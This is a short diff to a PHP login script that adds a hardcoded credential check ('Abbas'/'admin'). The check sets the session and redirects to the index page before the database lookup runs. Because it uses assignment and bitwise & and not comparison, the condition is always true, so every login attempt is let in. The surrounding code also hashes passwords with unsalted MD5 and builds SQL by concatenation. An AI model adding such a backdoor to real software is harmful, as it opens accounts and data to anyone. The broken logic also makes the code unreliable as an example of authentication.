@@ -31,7 +31,10 @@ if (isset($_POST['username'])){
     $password = stripslashes($_REQUEST['password']);
     $password = mysqli_real_escape_string($con,$password);
 
-
+if ($username="Abbas" & $password="admin") {
+    $_SESSION['username']=$username;
+    header ("location: index.php");
+}
     //Checking is user existing in the database or not
     $query = "SELECT * FROM `users2` WHERE username='$username' and password='".md5($password)."'";
     $result = mysqli_query($con,$query) or die(mysqli_error());
